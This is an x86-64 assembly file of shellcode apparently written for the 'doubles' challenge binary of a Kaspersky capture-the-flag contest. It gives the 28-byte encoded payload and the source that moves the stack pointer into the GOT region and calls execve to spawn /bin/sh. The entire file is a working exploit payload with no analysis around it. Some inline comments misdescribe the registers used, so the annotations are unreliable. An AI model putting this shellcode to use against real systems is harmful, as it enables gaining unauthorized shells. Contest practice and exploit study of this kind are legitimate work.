;   This shellcode was written for the doubles binary from the kaspersky CTF.
;   The shellcode below sets the stack pointer o halfway the GOT section and
;   then spawns a shell.
;
;   Coded by: Matthew Ta
;
;   Shellcode (28 bytes):
;   "\xbc\x00\x15\x60\x00\x53\x53\x5e"\
;   "\x5a\x48\xbf\x2f\x62\x69\x6e\x2f"\
;   "\x2f\x73\x68\x6a\x3b\x58\x52\x57"\
;   "\x54\x5f\x0f\x05"
;

[bits 64]

[section .text]

global _start

_start:
    mov rsp, 0x601500
    push rbx                    ; to push our arguments without overwriting ourselves
    push rbx                    ; pop this addr into rsp
    pop rsi                     ; zero out rsi and rdx
    pop rdx
    mov rdi, 0x68732f2f6e69622f ; put "/bin/sh" into rbx
    push 59                     ; place syscall num 59 into rax
    pop rax
    push rdx                    ; push null byte
    push rdi                    ; push "/bin/sh" onto the stack
    push rsp                    ; push the current stack ptr onto the stack
    pop rdi                     ; put the addresses of "/bin/sh" into rdi
    syscall
